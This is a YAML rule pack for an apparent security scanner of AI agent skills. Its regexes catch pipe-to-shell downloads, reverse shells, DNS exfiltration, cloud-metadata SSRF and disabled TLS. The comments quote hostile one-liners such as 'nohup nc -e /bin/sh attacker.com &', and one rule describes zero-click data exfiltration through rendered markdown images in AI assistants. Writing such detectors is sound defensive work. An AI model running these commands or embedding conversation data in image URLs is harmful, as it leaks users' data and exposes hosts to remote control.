apiVersion: skillguard.net/rulepack.v1
name: core-network
version: 1.0.0
description: Data exfiltration, egress, SSRF (rule-verification.md §3).
rules:
  - id: SG-NET-002
    title: Pipe-to-shell execution
    ast: [AST01]
    severity: critical
    engine: static
    layer: code
    confidence: 0.95
    targets: [body, scripts, configs]
    match:
      any:
        - regex: '(?i)\b(curl|wget|fetch)\b[^\n|]{0,200}\|\s*(sudo\s+)?(ba|z|k|d)?sh\b'
          confidence: 0.95
        - regex: '(?i)\b(curl|wget|fetch)\b[^\n|]{0,200}\|\s*(python[23]?|perl|node|ruby)\b'
          confidence: 0.9
        - regex: '(?i)\b(bash|sh)\s+-c\s+["'']?\$\((curl|wget|fetch)'
          confidence: 0.9
        # Process substitution `bash <(curl …)` / `sh <(wget …)` — a fetch-exec
        # form that never uses a pipe, so the leaves above miss it entirely.
        - regex: '(?i)\b(ba|z|k|d)?sh\b\s*<\(\s*(sudo\s+)?(curl|wget|fetch)\b'
          confidence: 0.9
        # `. <(curl …)` / `source <(curl …)` — sourcing a fetched stream into the
        # current shell; same effect, different keyword.
        - regex: '(?im)(\bsource\s+|(^|\s)\.\s+)<\(\s*(curl|wget|fetch)\b'
          confidence: 0.9
        # `eval "$(curl …)"` — command substitution fed straight to eval; the
        # canonical install-script fetch-exec that isn't a pipe.
        - regex: '(?i)\beval\b[^\n]{0,30}\$\(\s*(sudo\s+)?(curl|wget|fetch)\b'
          confidence: 0.9
        # `python -c "$(curl …)"` and peers — the downloaded text becomes the
        # interpreter's own program.
        - regex: '(?i)\b(python[23]?|perl|ruby|node)\s+-c\s+["'']?\$\(\s*(curl|wget|fetch)\b'
          confidence: 0.9
        # PowerShell download-and-run: `irm/iwr … | iex` (irm = Invoke-RestMethod,
        # at least as common as iwr for this) …
        - regex: '(?i)\b(iwr|irm|invoke-webrequest|invoke-restmethod)\b[^\n|]{0,200}\|\s*iex\b'
          confidence: 0.95
        # … and the prefix form `iex (irm …)` / `iex (New-Object Net.WebClient).DownloadString(…)`.
        - regex: '(?i)\biex\b\s*\(?\s*(iwr|irm|invoke-webrequest|invoke-restmethod|new-object\s+net\.webclient)'
          confidence: 0.9
    rationale: Downloading and piping content directly into an interpreter executes unreviewed remote code (AST01).
    fix: Never pipe network downloads into a shell/interpreter. Fetch, verify a checksum, review, then run.

  - id: SG-NET-007
    title: Rendered-image/link data exfiltration
    ast: [AST01]
    severity: critical
    engine: static
    layer: content
    confidence: 0.75
    targets: [body, manifest, scripts, configs, refs]
    match:
      any:
        # markdown image whose absolute URL interpolates a value into the query/fragment
        - regex: '(?i)!\[[^\]\n]{0,100}\]\(\s*https?://[^\s)]{0,200}[?&#][^\s)]{0,100}(\{\{|\$\{|%7[bB]|<[a-z][a-z0-9_ -]{1,40}>|\$[a-z][a-z0-9_]{2,})'
          confidence: 0.9
        # html <img src>/<a href> with the same interpolation shape
        - regex: '(?i)<(img|a)\s[^>\n]{0,200}(src|href)\s*=\s*["'']?https?://[^"''>\s]{0,200}[?&#][^"''>\s]{0,100}(\{\{|\$\{|%7[bB]|\$[a-z][a-z0-9_]{2,})'
          confidence: 0.9
        # plain markdown link (non-image) carrying interpolated query data
        - regex: '(?im)(^|[^!])\[[^\]\n]{0,100}\]\(\s*https?://[^\s)]{0,200}[?&#][^\s)]{0,100}(\{\{|\$\{|%7[bB])'
          confidence: 0.8
        # uppercase data-bearing placeholder in an image/link query — case-sensitive on purpose
        - regex: '!?\[[^\]\n]{0,100}\]\(\s*https?://[^\s)]{0,200}[?&][A-Za-z0-9_]{1,20}=[^\s)&]{0,60}(DATA|SECRET|TOKEN|API_?KEY|CONVERSATION|CONTEXT|HISTORY|CONTENTS?|SUMMARY|CREDENTIALS?|PROMPT)'
          confidence: 0.85
        # instruction framing: render an image/link that carries captured context.
        # The `(^|[^-\n])` guard keeps CLI flags (`--api-key`, `--input-image`) from
        # standing in for the prose noun — usage examples are not exfil instructions.
        - regex: '(?im)\b(embed|render|include|insert|append|display)\b[^\n]{0,60}\b(image|img|markdown link|hyperlink)\b[^\n]{0,100}(^|[^-\n])\b(conversation|chat history|context window|secret|api[ _-]?key|token|credential|previous message|system prompt|user data)\b'
          confidence: 0.75
        # encode-the-context-into-a-URL framing
        - regex: '(?im)\b(base64|url ?encod\w+|percent ?encod\w+)\b[^\n]{0,80}(^|[^-\n])\b(conversation|chat history|context window|secret|api[ _-]?key|token|credential|system prompt|user data)\b[^\n]{0,100}\b(image|img|url|query string|src=)\b'
          confidence: 0.75
    suppress:
      - '(?i)\b(img\.shields\.io|badge\.fury\.io|shields\.io)\b'
    rationale: >-
      A markdown or HTML image/link whose URL interpolates conversation, context, or secret values is
      fetched automatically by the rendering client, exfiltrating that data to the URL's host with no
      user click (zero-click). Unlike SG-NET-001 this needs no known-bad host — any attacker domain
      works. Real-world instance: EchoLeak (CVE-2025-32711) in M365 Copilot (AST01).
    fix: >-
      Never build image or link URLs from conversation content, tool output, or secrets. Use static
      URLs, or relative paths inside the bundle, and strip interpolation from any rendered markup.

  - id: SG-NET-001
    title: Egress to suspicious host
    ast: [AST01]
    severity: high
    engine: static
    layer: code
    confidence: 0.8
    targets: [body, scripts, configs, refs]
    match:
      any:
        - url_host: [pastebin.com, hastebin.com, ghostbin.com, dpaste.com, ix.io, 0x0.st, termbin.com]
          confidence: 0.8
        - url_host: [webhook.site, requestbin.com, pipedream.net, hookb.in]
          confidence: 0.85
        - url_host: [bit.ly, tinyurl.com, is.gd, t.co]
          confidence: 0.6
        - url_host: [ngrok.io, trycloudflare.com]
          confidence: 0.6
    rationale: Pastebin/webhook/shortener/tunnel hosts are common exfiltration and staging endpoints (AST01).
    fix: Send data only to documented, allowlisted endpoints you control.

  - id: SG-NET-005
    title: DNS exfiltration / hardcoded IP endpoint
    ast: [AST01, AST06]
    severity: medium
    engine: static
    layer: code
    confidence: 0.6
    targets: [body, scripts, configs]
    match:
      any:
        # Command substitution inside a DNS lookup: the classic covert channel —
        # the resolver ships the data even when egress is otherwise blocked.
        # Corpus: the only dig/nslookup uses are `dig example.com` in docs, with
        # no substitution, so this shape had 0 hits across 240 skills.
        # `host` is NOT in the verb list and the lookup must sit at a command
        # position (line start, or after ; & |). An earlier draft used a bare
        # word boundary plus "$( or backtick" and drew 24 corpus false positives
        # — markdown prose like "host: env[`${p}SMTP_HOST`]" and "host's hooks
        # dir (e.g. `.claude/hooks/`)" matched, flipping 5 skills pass -> warn.
        - regex: '(?im)(?:^|[;&|]\s*)(dig|nslookup|drill)\s+[^\n]{0,60}(\$\(|`)'
          confidence: 0.9
        # Data encoded into subdomain labels: <hex>.<hex>.attacker.tld.
        - regex: '(?i)\b([0-9a-f]{8,}\.){2,}[a-z0-9-]+\.[a-z]{2,}\b'
          confidence: 0.9
        # A lookup whose name is built from a command's output via a pipe.
        - regex: '(?i)\b(whoami|hostname|id|env|cat\s)[^\n|]{0,40}\|[^\n]{0,40}\b(dig|nslookup|drill)\b'
          confidence: 0.9
        # A literal IPv4 endpoint instead of a name. Deliberately left at 0.6:
        # near a documentary keyword the -0.4 drops it below the emit threshold,
        # which is the right outcome for an IP quoted in prose. Loopback and
        # private ranges are suppressed below — SG-SSRF-001 owns link-local
        # metadata, and every IP URL in the 240-skill corpus is 127.0.0.1.
        - regex: '(?i)https?://[0-9]{1,3}(\.[0-9]{1,3}){3}(:[0-9]+)?/'
          confidence: 0.6
    suppress:
      - '(?i)/path/to/'
      # Loopback, private and link-local: dev servers and SG-SSRF-001's turf.
      - '(?i)//(127\.|10\.|192\.168\.|169\.254\.|0\.0\.0\.0|localhost|172\.(1[6-9]|2[0-9]|3[01])\.)'
      # Public resolvers configured as resolvers are not exfiltration.
      - '(?i)\b(8\.8\.8\.8|8\.8\.4\.4|1\.1\.1\.1|9\.9\.9\.9)\b'
    rationale: A DNS lookup whose name is built from command output smuggles data out through the resolver, which usually stays reachable when direct egress is blocked; a hardcoded IP endpoint skips the hostname a reviewer or allowlist would check (AST01/AST06).
    fix: Resolve names you control and send data over reviewed, allowlisted endpoints. Never interpolate command output into a hostname.

  - id: SG-NET-006
    title: Listener / reverse-shell idiom
    ast: [AST01, AST06]
    severity: high
    engine: static
    layer: code
    confidence: 0.7
    targets: [scripts, configs, body]
    match:
      any:
        - regex: '(?i)bash\s+-i\s+>&?\s*/dev/tcp/'
          confidence: 0.95
        # reverse shell via any shell's -i redirected to /dev/tcp|udp (not just bash)
        - regex: '(?i)\b(sh|ash|dash|ksh|zsh)\s+-i\b[^\n]{0,40}/dev/(tcp|udp)/'
          confidence: 0.95
        # exec-based /dev/tcp reverse shell: `exec 5<>/dev/tcp/host/port`
        - regex: '(?i)\bexec\s+\d*<>\s*/dev/(tcp|udp)/'
          confidence: 0.9
        # -e / --exec must be followed by the program it executes. That is the
        # flag's entire purpose, so requiring it cannot lose a real reverse
        # shell — but the bare `nc -e` form is how *security tooling* writes the
        # signature down, and that was 4 of this rule's 10 corpus hits:
        # clawdefender's pattern array (`'nc -e'`, `'ncat -e'`, one per line) and
        # prompt-guard's docs (`| bash /dev/tcp, netcat -e, socat |` in a table).
        # `nohup nc -e /bin/sh attacker.com &` still fires, because that one is
        # the payload rather than a name for it.
        - regex: '(?i)\bnc\b[^\n]{0,40}\s-[a-z]*e\s*=?\s*["'']?(?:[~.]{0,2}/|\$|(?:sh|bash|zsh|cmd|powershell|python3?|perl)\b)'
          confidence: 0.9
        # ncat/netcat command-execution flags, same requirement
        - regex: '(?i)\b(?:ncat|netcat)\b[^\n]{0,40}(?:-e|--exec|--sh-exec)\s*=?\s*["'']?(?:[~.]{0,2}/|\$|(?:sh|bash|zsh|cmd|powershell|python3?|perl)\b)'
          confidence: 0.9
        # socat command-execution endpoints
        - regex: '(?i)\bsocat\b[^\n]{0,80}(EXEC|SYSTEM):'
          confidence: 0.9
        # mkfifo backpipe one-liner reverse shell
        - regex: '(?i)\bmkfifo\b[^\n]{0,120}\b(nc|ncat|netcat)\b'
          confidence: 0.85
        # interpreter reverse shell: socket fileno duped onto stdio, then a shell
        - regex: '(?i)os\.dup2\([^\n]{0,30}\.fileno\(\)'
          confidence: 0.85
        - regex: '(?i)\bpty\.spawn\(\s*[^\n)]{0,25}(sh|bash|/bin)'
          confidence: 0.75
        # powershell reverse shell
        - regex: '(?i)New-Object\s+(System\.)?Net\.Sockets\.TCPClient'
          confidence: 0.8
        # Bind-all listener. The old pattern was
        #   \.bind\(\(?\s*['"]?(0\.0\.0\.0|::)\b
        # and the trailing \b bound to *both* branches: `::` ends in a non-word
        # character, so a word boundary after it requires a word character next,
        # and `s.bind(("::", 8080))` is followed by a quote. **IPv6 bind-all was
        # invisible to the bind-all rule** while `0.0.0.0` matched — verified
        # both ways on e21d47f. This is instance four of the class audited in
        # #159, and the one with a live security consequence: `::` binds every
        # interface *including* IPv4-mapped addresses, so it is strictly the
        # broader exposure of the two.
        #
        # Rewritten to end on the host's own closing delimiter and the port
        # instead of a boundary, which also picks up two shapes the old leaf
        # never had: `[::]` (the bracketed literal) and the empty host, which is
        # INADDR_ANY by definition — `s.bind(("", 8080))` is bind-all spelled
        # without a name.
        #
        # The port is required to be a non-zero literal or an identifier, which
        # excludes `s.bind(('', 0))` — the standard "ask the kernel for a free
        # port" idiom. It is bind-all in the strict sense and benign in every
        # real use, and it is the one FP this widening would otherwise have
        # introduced. Corpus: all forms, old and new, measure 0 across 9938
        # files, so there is no precision evidence either way and the widening is
        # kept deliberately narrow — `.bind(` only, never `net.Listen`,
        # `app.run(host=…)` or `server.listen(port, host)`, which are how
        # ordinary dev servers spell the same address.
        - regex: '(?i)\.bind\(\s*\(?\s*(?:["''](?:0\.0\.0\.0|::|\[::\])?["'']|0\.0\.0\.0)\s*,\s*(?:[1-9][0-9]*|[A-Za-z_]\w*)'
          confidence: 0.7
    rationale: Reverse shells and bind-all listeners expose the host to remote control (AST01/AST06).
    fix: Bind only to localhost with authentication; remove reverse-shell code.

  - id: SG-SSRF-001
    title: Cloud metadata / SSRF endpoint access
    ast: [AST03, AST01]
    severity: high
    engine: static
    layer: code
    confidence: 0.9
    targets: [scripts, configs, body]
    match:
      any:
        - substring: "169.254.169.254"
          confidence: 0.9
        - substring: "metadata.google.internal"
          confidence: 0.9
        - substring: "100.100.100.200"
          confidence: 0.8
    rationale: Instance-metadata endpoints return temporary IAM credentials — a high-value SSRF/credential-theft target (AST03/AST01).
    fix: Remove metadata-endpoint access unless strictly required; never expose returned credentials.

  - id: SG-NET-008
    title: Disabled TLS / certificate verification
    ast: [AST01, AST06]
    # medium (warn, not fail), decided by corpus measurement. Disabling cert
    # verification is unambiguous in code, but it is not always *malicious*: a
    # skill talking to a local self-signed service (e.g. a self-hosted SearXNG)
    # legitimately sets `verify=False`. Static analysis cannot separate that from
    # "disable verification so my MITM works", so this surfaces the capability
    # for review rather than hard-failing — the SG-DEP-007 precedent. The risk
    # climbs sharply when paired with an exfil sink (SG-NET-004/007).
    severity: medium
    engine: static
    layer: code
    confidence: 0.7
    targets: [scripts, configs]
    match:
      any:
        # Python stdlib ssl: build an unverified context, or turn checks off.
        # These are API calls essentially never present for a benign reason —
        # 0 corpus hits — so they carry the higher confidence.
        - regex: '(?i)ssl\._create_unverified_context\s*\('
          confidence: 0.85
        - regex: '(?i)\bssl\.CERT_NONE\b'
          confidence: 0.8
        - regex: '(?i)\bcheck_hostname\s*=\s*False\b'
          confidence: 0.8
        - regex: '(?i)urllib3\.disable_warnings\s*\('
          confidence: 0.75
        # requests / httpx / aiohttp: verify=False. Real skills do this for
        # local self-signed certs, so it stays at the medium base — a nearby
        # documentary keyword (a comment explaining it) nets it below threshold,
        # which is the right outcome for `verify=False  # local self-signed`.
        - regex: '(?i)\bverify\s*=\s*False\b'
          confidence: 0.7
        # Node: reject nothing. The env-var form NODE_TLS_REJECT_UNAUTHORIZED=0
        # is deliberately NOT matched — corpus measurement found it appears
        # almost entirely in comments and in security tests that *defend against*
        # it (the evolver skills pin a strict agent and assert the cert is
        # rejected even when the global flag is 0). Matching it flagged those
        # security-positive skills 24 times; the actual code toggle below had 0
        # corpus hits and carries the Node signal cleanly.
        - regex: '(?i)\brejectUnauthorized\s*:\s*false\b'
          confidence: 0.8
        # curl / wget: skip verification on the command line. 0.9, not the base,
        # for a self-inflicted reason: the flag `--insecure` literally contains
        # the docKeyword "insecure", so this leaf's own match text always draws
        # the documentary -0.4 — and the host is often `example...`, drawing it
        # again. At the base it would never emit. Same documentary-modifier cliff
        # documented on SG-DEP-008/SG-EXE-001; see the engine-backlog row.
        - regex: '(?im)\b(curl|wget)\b[^\n|]{0,80}(\s-k\b|--insecure\b|--no-check-certificate\b)'
          confidence: 0.9
        # Go crypto/tls escape hatch.
        - regex: '(?i)\bInsecureSkipVerify\s*:\s*true\b'
          confidence: 0.85
        # git: turn off TLS verification for a clone/fetch.
        - regex: '(?i)(http\.sslVerify\s*=\s*false|GIT_SSL_NO_VERIFY)'
          confidence: 0.8
    suppress:
      # A line that shows the secure value too is documentation ("change
      # verify=False to verify=True"), not a disabled default. Word-anchored so
      # `GIT_SSL_NO_VERIFY=true` (its own real toggle) is not mistaken for it.
      - '(?i)\bverify\s*=\s*True\b'
      - '(?i)\brejectUnauthorized\s*:\s*true\b'
    rationale: A skill that turns off TLS certificate verification on its own network calls (verify=False, rejectUnauthorized:false, curl -k, InsecureSkipVerify, GIT_SSL_NO_VERIFY, an unverified ssl context) makes every request silently interceptable — a man-in-the-middle can read or rewrite the traffic, including any credential it sends (AST01 authored insecure behaviour / AST06 weakened transport boundary).
    fix: Keep certificate verification on. For a genuinely self-signed internal host, pin that host's CA certificate instead of disabling verification globally.
